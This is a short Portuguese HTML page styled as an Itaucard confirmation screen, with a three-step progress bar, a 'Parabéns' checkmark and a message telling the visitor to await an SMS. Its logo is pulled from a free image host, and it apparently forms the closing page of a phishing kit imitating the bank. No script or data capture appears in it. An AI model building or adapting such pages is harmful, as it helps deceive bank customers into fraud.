<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>concluido - Itaucard</title>
    <link rel="stylesheet" href="concluido.css">
</head>
<body>

    <div class="topo">
        <span class="texto">Itaucard</span>
        <img src="https://i.ibb.co/P93gD8p/IMG-20241209-WA0100-removebg-preview.png" alt="Descrição" class="imagem">
    </div>

    <!-- Linha cinza abaixo do texto -->
    <hr class="linha-cinza">

    <div class="circulo-container">
    <!-- Primeiro círculo com linha -->
    <div class="circulo-wrapper esquerda">
        <div class="circulo">
            <span class="numero">1</span>
        </div>
        <div class="linha"></div>
    </div>

    <!-- Segundo círculo com linha -->
    <div class="circulo-wrapper meio">
        <div class="linha"></div>
        <div class="circulo">
            <span class="numero">2</span>
        </div>
        <div class="linha"></div>
    </div>

    <!-- Terceiro círculo com linha -->
    <div class="circulo-wrapper direita">
        <div class="linha"></div>
        <div class="circulo">
            <span class="numero">3</span>
        </div>
    </div>
</div>
  
  <div class="container-parabens">
    <div class="circulo-parabens">
        <span class="simbolo">&#10003;</span>
    </div>
    <p class="texto-parabens">Parabéns</p>
</div>
  
  <p class="texto-abaixo-circulo">Confirmação efetuada com sucesso!</p>
  
  <p class="texto-abaixo-circulo-azul">Chegará uma mensagem via sms aguarde!</p>
</body>
</html>
